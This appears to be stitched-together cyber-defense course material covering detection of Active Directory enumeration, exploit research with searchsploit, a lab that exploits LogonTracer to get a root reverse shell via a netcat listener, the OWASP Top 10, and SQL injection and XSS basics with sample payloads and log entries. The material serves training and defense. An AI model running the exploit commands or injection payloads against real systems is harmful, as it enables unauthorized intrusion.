Another way to determine if NET.exe activity is suspicious is by examining its usage over time and creating a baseline. One red flag would be the observation that a certain user has not used the NET.exe command in the past 6 months but now they are enumerating Domain Admins and network shares. Time graphs can also be used to examine usage and determine if it is machine or human activity. Human activity is much more scattered than machine activity; machine activity usually has some semblance of structure to it. For example, if NET.exe is being run every hour, on the hour, automated machine activity — and perhaps an admin script — is likely occurring. This can be verified easily on a system by checking with the local admin or looking up the script or scheduled task that is triggering the activity.

﻿

The best tool is the analyst's mind. Get into the hacker's mindset, and filter everything analyzed through that lens.

﻿

In the labs that follow, this knowledge will be used to detect AD enumeration by running search queries in Security Onion.

﻿

PowerSploit/PowerView
﻿

PowerShell logs can be helpful when searching for PowerView activity. PowerShell Module logs (event ID 4103) and PowerShell Script Block logs (event ID 4104) can be used to gain valuable insights into an endpoint's PowerShell activity. PowerShell script block logging allows access to the full script being run, which can then be reverse engineered to understand what the adversary was doing. Such resources as Microsoft Ignite's articles on PowerShell provide more information on PowerShell logging, how to enable them, and how defenders can use them.

﻿

As discussed earlier, a baseline can be created to see what type of activity is normal. For example, most end users do not manually run PowerShell often. There may be cases where PowerShell is used as part of a login script, or used as part of expected normal activity — which can be excluded from analysis once identified as normal. Thus, searching for event codes 4103 and 4104 may return some spike in the timeline if a command like Find-DomainShare were run.

﻿

BloodHound/SharpHound
﻿

Multiple ways exist to detect SharpHound collection activity using client-side logs. SharpHound uses LDAP queries to perform the AD enumeration that collects the data to import into BloodHound for analysis. One way to detect SharpHound usage is to use Sysmon event ID 3 to look for several connections to TCP ports 389/636 (LDAP/LDAPS) and 445 (SMB). In addition, Sysmon event ID 18 can be used to look for several connections to named pipes srvsvc and lsass occurring at the same time as Sysmon event ID 3 events.

Detecting NET.exe Usage
This lab covers techniques to detect AD enumeration performed with NET.exe.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration using normal system tools. The time range is Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

5. Run an empty search across the time range Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

﻿

The results (indicated in the green box shown below) show nearly 65,000 logs — far too many to manually sift through.

6. Narrow the results by searching for Sysmon Event Code 1, the event identification (ID) that shows a process being created.

event.code: 1
﻿

The results (shown below) have been reduced significantly, but more than 1,000 logs are still too many to manually sift through.

﻿

The time chart in Figure 6.5-14 clearly shows some machine activity every 30 minutes from about time 14:05 to time 14:35.

7. To make the data easier to analyze, search for the following fields in the Search field names box on the left. (In Figure 6.5-15, host.name is in the Search field names box.) Once the fields are listed under Available fields (see Figure 6.5-15), select the plus sign to the right of each field's name to add the field as a column.

host.name

user.name

process.command_line

Once all the fields have been added, the results appear, as Figure 6.5-16 shows:

This makes analyzing logs much easier because it allows for quick inspection of the fields that are known to provide the most value during an investigation.

﻿

8. Adversaries use NET.exe for AD enumeration, so add a condition to the search so that it returns logs only where process.name is net.exe.

event.code: 1 AND process.name: net.exe
﻿
Both CH-DEV-1.vcch.lan and ch-dc1.vcch.lan appear to have had net.exe activity in this time range. From the original search (see Figure 6.5-14), it was observed that there is some sort of machine activity running every 30 minutes, and the net.exe activity on ch-dc1.vcch.lan appears to fall into that machine activity. This machine activity should be reported to the IT team. However, an even more interesting activity is occurring on CH-DEV-1.vcch.lan. Trainee, a non-admin user, is running net commands to enumerate information about users, groups, and shares. It even appears that they attempted to gain access to a share called bkup on the DC. This needs to be reported right away.

There are 19 SharpHound logs, some with a destination port of 389 and some with a destination port of 445, as expected. Notice that process.executable provides the path where SharpHound was run on the system.

Add a condition to the search query so only event codes 4103 and 4104 are returned. Event code 4103 is PowerShell module logs, and 4104 is PowerShell script block logs.

Sources for Known Exploits
Searching for known exploits is a matter of conducting open-source research and consulting the appropriate resources. CDAs find the following resources helpful in searching for pre-existing exploits.

﻿

MITRE CVE
﻿

MITRE Common Vulnerabilities and Exposures (CVE) is not necessarily a repository of exploits, per se, but functions more like a catalog of known software vulnerabilities that establishes a standard on how they should be reported. Each vulnerability is assigned a CVE Identifier (CVE-ID); most exploits can be mapped back to a CVE-ID. MITRE's CVE database can be found at cve.mitre.org.

﻿

National Vulnerability Database
﻿

The National Vulnerability Database (NVD) is — as the name suggests — a database that stores information about vulnerabilities and is maintained by the National Institute of Standards and Technology (NIST). Unlike CVEs however, the NVD provides more comprehensive information on a vulnerability other than the fact that it exists. Some additional information that the NVD provides is the Common Vulnerability Scoring System (CVSS) score, as well as links to associated resources such as existing exploits. This allows for a more proactive approach, as a CVSS score provides a severity gauge that system owners can use to prioritize vulnerabilities that need to be addressed, rather than reacting due to being exploited. The NVD can be accessed by visiting nvd.nist.gov.

﻿

Exploit-DB
﻿

Exploit-DB is a database for publicly known exploits maintained by Offensive Security. Each entry maps back to a CVE-ID, which enables defenders to match exploits back to the corresponding vulnerability. The Exploit-DB is intended as a repository of exploits and PoCs rather than an advisory system. However, if there are exploits available for systems or software in the mission partner network on Exploit-DB, it would be advisable to expeditiously patch vulnerable systems or implement other mitigations.

﻿

Metasploit
﻿

The Metasploit Project is an open-source penetration testing platform maintained by Rapid7. The free version is known as the Metasploit Framework. While much less comprehensive than Exploit-DB, the Metasploit Framework contains hundreds of exploits that are very easy to use with plug-and-play functionality, which makes it popular for offensive and defensive cyber personnel alike. Exploit-DB often has exploits written to be easily integrated into the Metasploit Framework as well. If a mission partner is found to have internet-facing systems that are vulnerable to exploits found in the Metasploit Framework, Incident Response (IR) and forensics may be a more appropriate measure, as it is extremely likely that the network is already compromised.

﻿

In the following lab, use a terminal utility that queries a locally stored copy of Exploit-DB to search for publicly-available exploits.

Recall that to get a list of running services, a port scan is conducted, which usually includes service versioning.


3. Run the following command to conduct a port scan as well as gather more information about the service version and potential Operating System (OS) version against the first host while skipping host discovery. Using sudo prompts for a password, which is CyberTraining1!.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -Pn -O 200.200.200.10

Sometimes, Nmap prints more output from Transmission Control Protocol (TCP)/Internet Protocol (IP) stack fingerprinting from OS detection. The determination for the OS is still the same. 


Based on the scan results, a possible Ubuntu OS with Secure Shell (SSH) and Hypertext Transfer Protocol (HTTP) is open. The SSH version is OpenSSH 8.2p1 and the HTTP server is Werkzeug HTTP Daemon (HTTPD) with a version of 0.14.1. SSH is running on the standard port, and HTTP is running on alternate port 8080 versus port 80.


Note that while the results of the OS detection were inconclusive (only returning Linux rather than the specific distribution), the service versioning returned more specific information regarding the OS. This is because Nmap uses different probes while performing service versioning and OS detection.


If there are no operational security concerns related to security products in the network, then more information is better — which is why -sV (probe for service/version info) and -O (OS detection) were both used despite returning different data.


Exploits may or may not be OS — and service version — specific, so gathering as much information as possible is important.


Since there is a web server running on the 200.200.200.10 host, gather additional information about what may be hosted on the server by visiting the webpage. There is a variety of web applications that have further vulnerabilities on top of the underlying web server software. For example, website content managers such as WordPress and Drupal have introduced several vulnerabilities that enabled attackers to conduct arbitrary remote code execution.


4. Open Firefox and visit the following webpage:
http://200.200.200.10:8080



The web application that has been imported into the range relies on resources on the internet that are not accessible in the range. This is why the page does not render properly in the environment.

The application running on the webserver is something called LogonTracer. However, no software version is available.


At this point in time, the following leads for software to search for an exploit are available:
OpenSSH 8.2
Wekzeug HTTPD 0.14.1
LogonTracer unknown software version

This is enough information to begin searching Exploit-DB for exploits. Kali Linux has a CLI that allows users to search exploits in Exploit-DB. A local copy of Exploit-DB is maintained, so for the newest exploits, the database may require an update. This can be accomplished by running the following command:
searchsploit -u



NOTE: Internet connectivity is needed for this to work, so this is not performed in this lab.


5. View the help menu for SearchSploit to get a general usage idea of the utility by running the following command:
(trainee@dmss-kali)-[~] $ searchsploit -h

The syntax is simple and reasonably straightforward. For the searches in the following steps, do not use any switches.


6. Run the following command to search for exploits related to OpenSSH:
(trainee@dmss-kali)-[~] $ searchsploit openssh

There does not seem to be a viable OpenSSH exploit for the current software version — 8.2. For reference, knowing what to look for depends on what is being attempted. To gain access to the system, look for something that enables command execution, whereas to ensure that a host had a failover system in place, then look for a Denial of Service (DoS). To see if the systems can be remotely accessed and execute the desired commands, good exploit candidates would have the following attributes:
Matching software
Matching software version
Matching OS (if applicable)
If the exploit must be done over the network, then remote somewhere in the exploit title or path
May allude to Code Execution or Command Execution
May allude to being Unauthenticated, as there are no credentials to use.

7. Run the following command to search for exploits related to Wekzeug HTTPD:
(trainee@dmss-kali)-[~] $ searchsploit wekzeug

Once again, there are no viable results.


8. Run the following command to search for exploits related to LogonTracer:
(trainee@dmss-kali)-[~] $ searchsploit logontracer

There is an exploit present for the software, though unfortunately, the version is unknown. This is a good time to read the exploit to see if it can be used. Notice the partial path provided — multiple/webapps/49918.py. The filename — 49918.py — is also the exploit ID. Make note of the exploit ID for the next step. 

9. Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
(trainee@dmss-kali)-[~] $ searchsploit -p 49918

The full file path — as shown from the results of the command — is /usr/share/exploitdb/exploits/multiple/webapps/49918.py. CDAs should always look at the exploit before using it for a few reasons such as:
Finding usage instructions
Finding out more information about what the exploit is actually doing
Making modifications to the exploit script
Ensuring that there is no malicious code in the exploit

10. Run the following command to read the exploit script:
(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py

From lines 13–16, the user needs to provide the attacker's IP address, attacker's port, and the Uniform Resource Locator (URL) to the victim.

From lines 22–29, it is evident that it is a command injection vulnerability that is being exploited, which sends back a shell to an attacker's listener.

Keep in mind, it is not necessary to understand everything that is happening in the script, just a general idea of what it is doing. There is no need for an in-depth code review.


11. Run the following command to print the exploit script's help menu:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h

Now the syntax of the command is known.

12.  Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

13. Open a new tab or window, and run the following command to run the exploit:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080

The output states If the terminal hangs, you might have a shell. Since the terminal hangs immediately after sending the exploit, this is a good sign.

14. Switch back to the other terminal where Netcat was running.

A shell was received from the exploited host. Notice that a few seemingly random characters are returned in the prompt as well. These are escape codes, which are responsible for formatting text that is typically seen when entering text into a terminal and do not affect running commands.

15. Run a command to check the functionality of the shell.
(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami

The shell appears to be in working order, and notice you are the root user on the victim host.

Mitigating Known Exploits
Mitigating known exploits is usually a matter of removing the underlying vulnerability; if the vulnerability does not exist, then the exploit does not work. However, network defenders need to be aware of the vulnerabilities and remain updated on the latest ones to be able to effectively mitigate them. Mitigating vulnerabilities may be composed of a few elements.

﻿

﻿

﻿

Asset Management
﻿

To know which devices are vulnerable, it is necessary to know what devices actually exist within the network. While this sounds like a simple matter, asset management can quickly get out of hand, especially in larger organizations. Vulnerable devices do not just apply to workstations and servers; it applies to any computing device running some kind of OS. This includes Internet of Things (IoT) devices, multi-function devices, printers, video teleconferencing equipment, etc., which many network defenders overlook. 

﻿

Updates and Patching Policy
﻿

Updates and patches are among the most effective measures of mitigating known exploits. Once a vulnerability is made public, vendors typically issue a patch that can be applied to the vulnerable system. Patches are often referred to as hotfixes or security updates. While applying the necessary patches seems like a common-sense measure, organizations may not have an effective patching policy in place, which leaves them vulnerable to the whims of attackers. For example, in the Equifax Breach that occurred in 2017, attackers exploited a vulnerability in Apache Struts when the patch was released two months prior.

﻿

Once an idea of what type of systems exist in the network is determined, the next piece of the puzzle is to examine the update and patching policy. Are updates done monthly or weekly or even at all? Are they rolled out automatically? Which systems receive patches? These are some of the questions asked when investigating the updates and patching policy. A good patching policy typically includes the following steps:

Evaluating patches
Testing patches
Approving patches
Deploying patches
Verifying patch deployment
Some companies publish updates on a specific day of the month. Adobe, Microsoft, and Oracle release updates every second Tuesday of the month. This makes it easy for system administrators to plan around them and gives them time to schedule testing and deployment. Patch Tuesday — as it was coined, unfortunately — is followed by Exploit Wednesday. Since attackers also know the update schedule, they often attempt to reverse engineer the patches released on Tuesday, and then exploit devices on Wednesday since it is common for system administrators to not issue updates immediately.

﻿

Periodic Vulnerability Scans/Assessments
﻿

Vulnerability scanning and assessments were covered in a previous module. Some of the tools covered included Assured Compliance Assessment Solution (ACAS), OpenVAS, and Nmap. Conducting periodic vulnerability scans reveals vulnerabilities not addressed by updates and patching. They may also catch configuration-related vulnerabilities, weak passwords, etc. Vulnerability scans allow system administrators to proactively identify existing vulnerabilities and defend their systems before attackers exploit them. One important note to keep in mind is that a vulnerability scanner is only as good as its signatures. To get the best use out of a vulnerability scanner, conduct regular updates on the software to have the most up-to-date vulnerability database.

sqli

Web Attacks Overview 
Adversaries may look to exploit the Application layer of the Open Systems Interconnection (OSI) model — Layer 7. Layer 7 is the top layer of the model. It is at the Application layer where users interact with software (applications) that can be connected to the internet. The servers and databases are responsible for hosting the web applications, which may be vulnerable to attacks. The servers and databases connected to the internet are designed to be running and reachable by users at all times, meaning they are constantly susceptible to an attack. The servers and databases also often contain sensitive data regarding Personal Identifiable Information (PII) and information regarding the systems and services to which they are connected, making them an attractive target for the adversary. Another obstacle for defense teams to consider is the location of the servers and databases on the network. 

OWASP Top 10 Web Application Security Risks
﻿

(Image from OWASP)

﻿

The leading organization in defining risks, vulnerabilities, and providing defensive strategies for web applications and attacks is Open Web Application Security Project® (OWASP). OWASP is a nonprofit foundation whose primary goal is to improve the security of software. The OWASP Top 10 Web Application Security Risks — simply referred to as the OWASP Top 10 — is a standard awareness document for developers and web application security. The OSWAP Top 10 represents a broad consensus about the most critical security risks to web applications. Below is the 2024 OWASP Top 10:

﻿

1. Broken Access Control
﻿

User access restrictions are often not properly enforced or enforced insecurely, which can allow attackers to gain unauthorized functionality (e.g., administrator portal) or access to other user accounts, data, etc.

﻿

2. Cryptographic Failures 
﻿

A broad symptom rather than a root cause, the focus is on failures related to cryptography — or lack thereof. This often leads to exposure of sensitive data. An organization must determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, PII, and business secrets require extra protection, mainly if that data falls under privacy laws (e.g., European Union's General Data Protection Regulation [GDPR]) or regulations (e.g., financial data protection such as Payment Card Industry Data Security Standard [PCI DSS]).

﻿

3. Injection
﻿

Injection flaws occur when untrusted data is passed to an interpreter as part of a command or query within a web application. The untrusted data can allow the attacker to execute code on the underlying web server. These flaws can be associated with, but are not limited to, SQL, NoSQL, Operating System (OS), and Lightweight Directory Access Protocol (LDAP), and can provide access to the underlying web server in many cases. Exploitation leads to server access.

﻿

4. Insecure Design 
﻿

Insecure design is a broad category representing different weaknesses, expressed as missing or ineffective control design. Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. The differentiation between design flaws and implementation defects is necessary as they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as, by definition, they need security controls that were never created to defend against specific attacks. One factor that contributes to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.

﻿

5. Security Misconfiguration
﻿

Security misconfiguration is the most commonly seen issue. These misconfigurations cover all aspects of security from insecure default configurations, unfinished installations, unpatched services, verbose logging, and many more. 

﻿

6. Using Components with Known Vulnerabilities
﻿

Web applications are often a melting pot of code from many other sources. Using modules and libraries that run with the same privileges as the rest of the web applications can increase the speed of development, but can also enable unknown vulnerabilities on a web application. If external code is not reviewed for patches and vulnerabilities, even the securest of coding practices can be left vulnerable. 

﻿

7. Identification and Authentication Failures
﻿

Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:

Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.
Permits brute force or other automated attacks.
Permits default, weak, or well-known passwords, such as Password1 or admin/admin.
Uses weak or ineffective credential recovery and forgot-password processes, such as knowledge-based answers, which cannot be made safe.
8. Software and Data Integrity Failures 
﻿

Software and data integrity failures relate to code and infrastructure that do not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and Content Delivery Networks (CDN). An insecure Continuous Integration/Continuous Delivery (CI/CD) pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Examples that are vulnerable to insecure deserialization include objects or data encoded or serialized into a structure that an attacker can see and modify.

﻿

9. Insufficient Logging and Monitoring
﻿

Logging and monitoring are paramount for externally-facing services. Logging and monitoring of those logs are required in any Incident Response (IR) to draw the full picture of an incident. Without logging and monitoring, it is very difficult to review what happened during the incident or to even realize that an event occurred. Exploitation is not really a factor, but insufficient logging and monitoring affect all other compromise remediation.

10. Server-Side Request Forgery﻿

Server-Side Request Forgery (SSRF) flaws occur when a web application is fetching a remote resource without validating the user-supplied Uniform Resource Locator (URL). It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, Virtual Private Network (VPN), or another type of network Access Control List (ACL).﻿

As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.

﻿
In many cases, the OWASP Top 10 can be mitigated by filtering the user input prior to passing the data to the underlying services. Vigilance in patching and proper code review of any externally-sourced code helps decrease exploit vectors. If the web application is hosted on a web server, it is important to securely configure that underlying web server service as well as the other services on the host, and remove any unneeded services. For example, Common UNIX Printing System (CUPS) is a print server that is installed and enabled on many Linux distributions by default. CUPS has had nine documented Common Vulnerabilities and Exposures (CVE) since 2017, which include Remote Code Execution (RCE) that could lead to the compromise of a web server without any interaction with the web application itself.

Which of the OWASP Top 10 occurs when user access restrictions are often not properly enforced or enforced insecurely?

SQLI Overview
SQLI is an attack exploiting the injection of SQL commands into the SQL queries of a web application. A successful SQLI attack gains the adversary access to a database that operates as the backend to a web application. Web applications commonly use a database for storing and managing data such as user credentials. To interact with databases, entities such as systems operators, programmers, and web applications use the Structured Query Language (SQL). The code takes care of establishing and keeping the connection to the database by using connectors. The fundamental principle of an injection attack is identifying a vulnerability that enables an escape from the intended code or query, allowing the attacker to inject arbitrary code of their own, which is executed by the victim server under the guise of whichever process presents the web interface or backend database externally. In a SQLI attack, which targets poorly-coded requests for input that is inserted into a query to the backend database, the attacker principally seeks to achieve an escape through the use of characters that a web engineer failed to sanitize.

Most modern web applications need to keep some permanent storage. Storage is typically accomplished with a database. Web applications commonly communicate with their database backend using SQL. With SQL, the applications create queries to read and write information in the database.

In addition, web applications frequently exploit user input as part of their SQL queries. However, SQL is often constructed as a string in the underlying programming language and passed to the database. If the programmer is not careful, there is a blurred line between user input and SQL query structure, allowing users to modify the query structure and change the query's intended behavior. This is done by using input that makes use of the SQL query syntax. Since the user input is concatenated to the rest of the query, the database interprets the SQL syntax in the user input as part of the query, causing the query to change into something potentially harmful.

SQLI Fundamentals
To understand how SQLIs happen, consider the following SQL query:

Figure 7.3-2 displays a basic query used to authenticate a user on a web application. In this scenario, the username input gets placed between the quotes after username and the password input between the quotes after password. If the user entered a username of 'admin' and a password of 'test123,' the query that gets passed to the database is the following:

If the underlying programming language concatenates the user input, the SQL query interpreter converts any special characters in the username or password. This allows the query syntax to be changed. For example, consider what happens if the username is set to a single quote, but the password remained test123. The resulting SQL query is the following:

The query example above contains three single quotes in a row to the database server. These quotes are interpreted as two strings side by side. The first string, delimited by the first two single quotes, is interpreted as an empty string. The third quote starts another adjacent string that ends with the equal sign after the word password. Adjacent strings are typically valid syntax in SQL queries. However, the second string is immediately followed by the word test123'. The database interprets the string as a keyword. But test123' is not a valid keyword in SQL, so the database throws an error for an ill-formed SQL query.

﻿
The main point from the example above is that by including certain special characters, the attacker causes the database to misinterpret the SQL query and even inject SQL keywords that were not originally there. This can allow an attacker to inject functionality into the SQL query.

Now, consider a common proof of concept attack for this vulnerability type, in which the username is set to admin and the password to the following:

password' or 1='1
﻿

This results in the following query:

The first quote in the password field is interpreted as the end of the password value.

The or is interpreted as a logical OR operator.

The 1='1' is interpreted as an added condition.

In other words, find all users with the username admin and either the password equal to password or where the condition 1=1 is true. The final condition is always true, and so the check passes regardless of whether the password is actually password.

Common Characters and Syntax
﻿
SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:

Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 

Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

Common Characters and Syntax


SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:

Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 


Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

Cross-Site Scripting Overview
XSS is an attack in which its ultimate purpose is to inject HTML — known as an HTML injection — into a user’s web browser. XSS is one of the oldest web application attacks known and is dated to around 1996–1998, when it was possible to control frames within a webpage through injected code, providing the crossing of website boundaries. Currently, XSS is still on top of the OWASP Top 10 Web Application Security Risks. XSS is considered an attack against the user of a vulnerable website; it is difficult to anticipate and prevent. Knowledgeable developers actively trying to prevent attacks may be vulnerable to other possible forms of attack that they are not aware of.

﻿

HTML and CSS Markup Attacks
﻿

The most basic of XSS attacks is the insertion of HTML and Cascading Style Sheets (CSS) content into the HTML of a website. This simple attack is executed by injecting a comment or annotation that is then displayed on the website. Website users do not have any power to stop this attack as they are not able to turn off HTML rendering in the browser (in the same way that they can turn off JavaScript or images). The adversary who accomplishes an exploit like this can obscure part or all of the page, and render official-looking forms and links for users to interact with.

﻿

Stored XSS
﻿

Stored XSS is a version of the attack where input is stored on the target server. Typically the input is stored in a database, message forum, log, or comment field. The user then interacts with the website, which retrieves the stored data from the website and sends it to the user. 

﻿

Reflected XSS
﻿

As defined by OWASP, reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user-provided data. To execute the reflected version of the XSS attack, an injected script reflects off the target server. The reflection is done by a page search result, an error message, or another created message by the user. Reflect XSS is a very damaging style of attack because it weaponizes the trust of the server from which the code is reflecting. 

﻿

Document Object Model-Based XSS
﻿

Document Object Model (DOM)-Based XSS, also referred to as Type-0 XSS, is a version of the attack where the execution of the attack occurs as a result of modifying the DOM environment in the target's browser. The modification occurs within the client-side script, as a result, the script does not perform as expected. When executed properly, the page itself — the HTTP response — does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

Identifying SQLI in Logs
Log files provide a valuable piece of evidence in helping identify a web application attack. The logs collected on servers and applications record all actions and requests made to the device. Hidden within the logs are pieces of information that identify the type of attack, when the attack occurred, and what IP address was responsible.

﻿

Web logs are log files that are created and maintained by web servers on a network. Web logs contain information about the connections and requests made to the website or application — information that is critical in an investigation. On a typical web server, there are two types of log files: access.log and error.log. The access.log file contains all requests made by users interacting with the application. Information in the access.log file includes what pages the users are viewing, the status of requests, and the speed requests were served. The error.log contains all errors the server encountered. For the purposes of defense, security, and investigation, the access.log is the primary focus.

﻿

Expected Web Log Entry
﻿

Below is a sample entry in the access.log. The entry typically — and expectedly — contains the successful login of the DVWA:

127.0.0.1 - - [20/Oct/2021:15:01:12 -0400] "GET /dvwa/login.php HTTP/1.1" 200 1415 "http://localhost/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 20, 2021 @ 15:01:12 
Time on the server (relative to UTC): -0400
Request made: GET /dvwa/login.php HTTP/1.1" 200
The request here is the user logging into the DVWA via the use of HTTP. The number 200 is a Hypertext Transfer Protocol (HTTP) status code — 200 indicates the request succeeded. In this case, the user was able to log in.
URL: http://localhost/ 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (Konqueror Hyper Text Markup Language [KHTML], like Gecko) Chrome/44.0.2403.155 Safari/537.36
Web Log Entry with SQLI Attack
﻿

Below is a sample entry in the access.log including a successful SQLI attack:

127.0.0.1 - - [21/Oct/2021:09:30:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200 4342 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 21, 2021 @ 09:30:02 
Time on the server (relative to Greenwich Mean Time): -0400
Request made: GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200
The request here is the user making a request within the DWVA SQLI page. The user requested ?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit. The HTTP status code 200 indicates the request succeeded. 
URL: http://localhost/dvwa/vulnerabilities/sqli
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
The use of the UNION operator, as well as the URL encoded @ symbol (hex %40) for the global variable, is an immediate red flag and indicative of a potential attempt to leverage the SQL database. The log entry above was taken from the SQLI lab earlier in this lesson where SQLI was used to derive the database's location. The query is provided below:

'UNION SELECT null, @@datadir#

'UNION ALL SELECT current_user(),user() #             =============       The database's current user







